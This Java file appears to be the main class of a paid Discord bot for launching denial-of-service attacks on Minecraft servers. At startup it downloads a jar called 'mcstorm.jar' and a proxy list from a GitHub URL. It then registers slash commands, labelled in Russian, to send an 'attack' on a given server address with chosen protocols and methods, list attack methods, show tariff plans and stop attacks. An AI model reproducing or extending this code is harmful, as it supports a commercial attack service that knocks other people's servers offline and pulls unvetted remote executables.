package net.servokio.q4mc;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.commands.build.OptionData;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.servokio.q4mc.discord.Discord;
import net.servokio.q4mc.listeners.DiscordListener;
import net.servokio.q4mc.threads.ThreadManager;
import net.servokio.q4mc.threads.autoUpdate;
import net.servokio.q4mc.utils.Methods;
import net.servokio.q4mc.utils.Protocols;

import javax.security.auth.login.LoginException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.List;

public class MainDC {
    public JDA jda;
    String[] args;
    public static MainDC main;
    public int attacks;
    public List<String> banned;
    public List<String> admins;
    public List<String> dro4er;

    // Modules
    public Discord discord;
    public Protocols protocols;
    public Methods methods;
    public ThreadManager threadManager;
    public autoUpdate autoU;

    public MainDC(String[] args) {
        this.args = args;
        this.discord = new Discord();
        this.protocols = new Protocols();
        this.methods = new Methods();
        this.threadManager = new ThreadManager();
        this.banned = new ArrayList<>();
        this.admins = new ArrayList<>();
        this.dro4er = new ArrayList<>();
        this.autoU = new autoUpdate();
        this.autoU.start();
    }

    public static void setInstance(MainDC main) {
        MainDC.main = main;
    }

    public static MainDC getInstance() {
        return main;
    }

    public void init() {
        setInstance(this);
        File jar = new File("./mcstorm.jar");
        try {
            if (jar.exists()) {
                // Если есть
                updateProxy();
            } else {
                URL website = new URL("https://github.com/ivanoffskiy/test/raw/main/mcstorm.jar");
                ReadableByteChannel rbc = Channels.newChannel(website.openStream());
                FileOutputStream fos = new FileOutputStream("./mcstorm.jar");
                fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                updateProxy();
            }
            startJDA();
        } catch (Exception e) {
            System.out.println("E: " + e.getMessage());
            System.exit(0);
        }
    }

    private void updateProxy() throws IOException {
        URL url = new URL("https://raw.githubusercontent.com/ivanoffskiy/test/main/proxies.txt");
        ReadableByteChannel rbc = Channels.newChannel(url.openStream());
        FileOutputStream foss = new FileOutputStream("./proxies.txt");
        foss.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
    }

    public void startJDA() {
        try {
            jda = JDABuilder
                    .createDefault(Config.TOKEN)
                    .enableIntents(GatewayIntent.GUILD_MEMBERS)
                    .setChunkingFilter(ChunkingFilter.ALL)
                    .setMemberCachePolicy(MemberCachePolicy.ALL)
                    .setAutoReconnect(true)
                    .addEventListeners(new DiscordListener())
                    .build();
            jda.awaitReady();
            for (Guild guild : jda.getGuilds())
                guild.loadMembers().onSuccess(
                        members -> System.out.println("Loaded " + members.size() + " members in guild " + guild))
                        .onError(throwable -> System.out.println("Failed to retrieve members of guild " + guild)).get();
        } catch (LoginException | InterruptedException e) {
            System.out.println(e.getMessage());
        }
    }

    public void onReady() {
        for (Guild g : jda.getGuilds()) setupGuild(g); //
    }

    public void setupGuild(Guild g) {
        try {
            //apanel
            OptionData apanel = new OptionData(OptionType.STRING, "command", "subcommand", true);
            apanel.addChoice("admin", "admin");
            apanel.addChoice("stats", "stats");
            apanel.addChoice("stopall", "stopall");
            apanel.addChoice("cn", "cn");

            //короче облом
            g.updateCommands().addCommands(
                    Commands.slash("info", "Информация"),
                    Commands.slash("help", "Помощь"),
                    Commands.slash("attack", "Отправить атаку")
                            .addOption(OptionType.STRING, "address", "Адрес сервера", true)
                            .addOptions(this.protocols.getDiscordData())
                            .addOptions(this.methods.getDiscordData()),
                    Commands.slash("resolve", "Информация о сервере")
                            .addOption(OptionType.STRING, "address", "Адрес сервера", true),
                    Commands.slash("methods", "Методы атаки"),
                    Commands.slash("plan", "Тарифные планы"),
                    Commands.slash("stop", "Stop your attacks"),
                    Commands.slash("apanel", "Admin panel").addOptions(apanel)

            ).queue();
            System.out.println("|| Commands updated!");
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    public int incAtt() {
        attacks++;
        return attacks;
    }

    public static void log(String message) {
        System.out.println(message);
    }
}